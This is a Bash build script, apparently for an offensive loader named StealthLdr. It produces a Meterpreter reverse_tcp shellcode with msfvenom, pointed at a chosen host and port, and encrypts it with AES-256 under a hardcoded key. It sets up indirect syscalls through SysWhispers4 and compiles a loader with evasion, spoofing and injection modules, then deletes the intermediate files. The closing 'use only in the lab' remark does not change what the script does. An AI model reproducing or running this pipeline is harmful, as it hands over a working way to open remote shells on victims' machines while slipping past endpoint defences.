#!/bin/bash
# StealthLdr - Pipeline Automático 2026
# Uso: ./build.sh <LHOST> <LPORT> [output_name.exe]

set -e

LHOST=$1
LPORT=$2
OUTPUT=${3:-stealthldr.exe}

if [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
    echo "Uso: $0 <LHOST> <LPORT> [output_name]"
    echo "Exemplo: $0 192.168.1.100 4444 meu_beacon.exe"
    exit 1
fi

echo "🚀 StealthLdr - Iniciando build completo (2026)"
echo "LHOST: $LHOST | LPORT: $LPORT | Output: $OUTPUT"
echo "==================================================="

# 1. SysWhispers4 + Indirect Syscalls
echo "[1/5] Preparando SysWhispers4..."
if [ ! -d "SysWhispers4" ]; then
    git clone https://github.com/JoasASantos/SysWhispers4.git
fi
cd SysWhispers4 && git pull && cd ..
cd SysWhispers4
python3 syswhispers.py --preset common --method indirect -o ../syscalls
cd ..

# 2. Gerar shellcode
echo "[2/5] Gerando shellcode com msfvenom..."
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shellcode.bin

# 3. Encriptar shellcode (AES-256 CBC)
echo "[3/5] Encriptando shellcode com AES-256..."
cat > encrypt.py << 'PYEOF'
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

key = b'StealthLdrKey2026AES256!!'[:32]
iv = os.urandom(16)

with open('shellcode.bin', 'rb') as f:
    data = f.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
ct = cipher.encrypt(pad(data, AES.block_size))

with open('shellcode.enc', 'wb') as f:
    f.write(iv + ct)

print(f"[+] Shellcode encriptado ({len(iv + ct)} bytes) -> shellcode.enc")
PYEOF

python3 encrypt.py

# 4. Compilar
echo "[4/5] Compilando StealthLdr.exe ..."
x86_64-w64-mingw32-g++ -o $OUTPUT \
    main.cpp evasion.cpp crypto.cpp spoofing.cpp injection.cpp syscalls.c aes.c \
    -I. -lntdll -static -O2 -s -fno-stack-protector -w -D_CRT_SECURE_NO_WARNINGS

echo "[5/5] Limpando temporários..."
rm -f shellcode.bin encrypt.py

echo "==================================================="
echo "✅ Build finalizado!"
echo "📁 Arquivo gerado: $OUTPUT"
echo ""
echo "Teste no Windows:"
echo "   .\\$OUTPUT shellcode.enc"
echo ""
echo "Boa sorte nos estudos! Use apenas em laboratório."
